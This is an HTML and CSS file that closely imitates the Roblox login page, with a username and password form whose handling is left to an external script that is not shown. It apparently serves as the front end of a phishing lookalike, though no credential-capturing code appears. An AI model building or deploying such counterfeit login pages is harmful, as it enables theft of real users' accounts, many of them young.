<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Log in to Roblox</title>
  <style>
    /* Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #1d1d1d;
      background-image: radial-gradient(circle at center, #222 1px, transparent 1px);
      background-size: 40px 40px;
      color: #f0f0f0;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }

    header {
      position: relative;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 30px;
      background-color: #2c2c2c;
      box-shadow: 0 2px 5px rgba(0,0,0,0.8);
      user-select: none;
      gap: 20px;
      min-height: 52px;
    }

    /* Left container: logo + nav items */
    .left-nav {
      display: flex;
      align-items: center;
      gap: 30px;
      flex-shrink: 0;
    }

    .logo img {
      height: 32px;
      cursor: default;
      user-select: none;
    }

    /* Nav items */
    .nav-menu {
      display: flex;
      gap: 25px;
      align-items: center;
      white-space: nowrap;
    }

    .nav-menu .nav-item {
      color: #f0f0f0;
      font-weight: 600;
      font-size: 15px;
      cursor: pointer;
      transition: color 0.2s ease;
    }

    .nav-menu .nav-item:hover {
      color: #007bff;
    }

    /* Center container: search bar, absolutely centered */
    .search-container {
      position: absolute;
      left: 50%;
      transform: translate(-50%, -50%);
      top: 50%;
      z-index: 10;
    }

    /* Search box */
    .search-box {
      width: 320px;
      background-color: #2c2c2c;
      border: 1.5px solid #444;
      border-radius: 4px;
      padding: 6px 12px 6px 36px; /* padding left for icon */
      color: white;
      font-size: 14px;
      outline: none;
      background-repeat: no-repeat;
      background-position: 10px center;
      transition: border-color 0.3s ease, background-color 0.3s ease;
      background-image: url("data:image/svg+xml;utf8,<svg fill='white' height='16' width='16' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'><circle cx='10' cy='10' r='6' stroke='white' stroke-width='2' fill='none'/><line x1='15' y1='15' x2='21' y2='21' stroke='white' stroke-width='2' stroke-linecap='round'/></svg>");
    }

    .search-box::placeholder {
      color: #888;
    }

    .search-box:focus {
      border-color: #007bff;
      background-color: #3a3a3a;
    }

    /* Right container: signup button */
    .nav-buttons {
      flex-shrink: 0;
    }
    .nav-buttons button {
      background: #007bff;
      color: white;
      border: 2px solid #007bff;
      padding: 8px 18px;
      border-radius: 5px;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
      transition: background-color 0.3s ease, border-color 0.3s ease;
      user-select: none;
    }

    .nav-buttons button:hover {
      background-color: #0056b3;
      border-color: #0056b3;
    }

    main {
      flex-grow: 1;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    form#loginForm {
      background-color: #2c2c2c;
      padding: 40px 40px;  /* increased padding left and right */
      width: 420px;        /* made it wider */
      border-radius: 0; /* no rounded corners */
      box-shadow: 0 0 15px rgba(0,0,0,0.8);
      display: flex;
      flex-direction: column;
      color: #f0f0f0;
    }

    form#loginForm h2 {
      margin-bottom: 25px;
      font-weight: 700;
      font-size: 22px;
      text-align: center;
    }

    form#loginForm input[type="text"],
    form#loginForm input[type="password"] {
      padding: 12px 10px;
      margin-bottom: 20px;
      border: 1px solid #555555;
      border-radius: 5px;
      font-size: 14px;
      background-color: #1d1d1d;
      color: #f0f0f0;
    }

    form#loginForm input::placeholder {
      color: #999999;
    }

    form#loginForm button[type="submit"] {
      padding: 12px;
      background-color: #2c2c2c;
      color: white;
      font-weight: bold;
      font-size: 16px;
      border: 1.5px solid white;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease, color 0.3s ease;
      width: 100%;
      align-self: center;
    }

    form#loginForm button[type="submit"]:hover {
      background-color: #444444;
      border-color: #eee;
      color: #eee;
    }

    /* Forgot password/username link */
    .forgot-link {
      margin-top: 15px;
      text-align: center;
    }

    .forgot-link a {
      color: white;
      font-weight: 700;
      font-size: 14px;
      text-decoration: none;
      cursor: default;
      user-select: none;
    }

    hr.divider {
      border: none;
      border-top: 1px solid #ccc; /* single light gray line */
      margin: 15px 8px;
      position: relative;
    }

    .email-code {
      margin: 10px 10px 0 10px;
      padding: 8px 0;
      border: 1.5px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
      color: #ccc;
      text-align: center;
      font-weight: 600;
      user-select: none;
      cursor: default;
      outline: none;
      transition: background-color 0.2s ease;
    }

    .email-code:focus,
    .email-code:hover {
      background-color: #3a3a3a;
      border-color: #aaa;
      color: #eee;
    }

    /* Small text under Use Another Device */
    .small-text {
      margin: 10px 0 0 0;
      font-size: 12px;
      color: #999;
      text-align: center;
      user-select: none;
    }

    .small-text strong {
      font-weight: 700;
      color: #eee;
      cursor: default;
    }
  </style>
</head>
<body>

  <header>
    <div class="left-nav">
      <div class="logo">
        <img
          src="https://cdn.freelogovectors.net/wp-content/uploads/2021/12/robloxlogo-freelogovectors.net_.png"
          alt="Roblox Logo"
          draggable="false"
        />
      </div>
      <nav class="nav-menu" aria-label="Main Navigation">
        <div class="nav-item">Charts</div>
        <div class="nav-item">Marketplace</div>
        <div class="nav-item">Create</div>
        <div class="nav-item">Robux</div>
      </nav>
    </div>

    <div class="search-container">
      <input
        class="search-box"
        type="text"
        placeholder="Search"
        aria-label="Search"
      />
    </div>

    <div class="nav-buttons">
      <button>Signup</button>
    </div>
  </header>

  <main>
    <form id="loginForm">
      <h2>Login to Roblox</h2>
      <input type="text" id="username" placeholder="Username" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Log In</button>

      <div class="forgot-link">
        <a href="#" tabindex="0">Forgot Password or Username</a>
      </div>

      <hr class="divider" />

      <div class="email-code" tabindex="0">Email Me a One-Time Code</div>
      <div class="email-code" tabindex="0" style="margin-top: 10px;">Use Another Device</div>
      <div class="small-text">
        Don't Have An Account? <strong>Sign Up</strong>
      </div>
    </form>
  </main>

  <script src="script.js"></script>
</body>
</html>
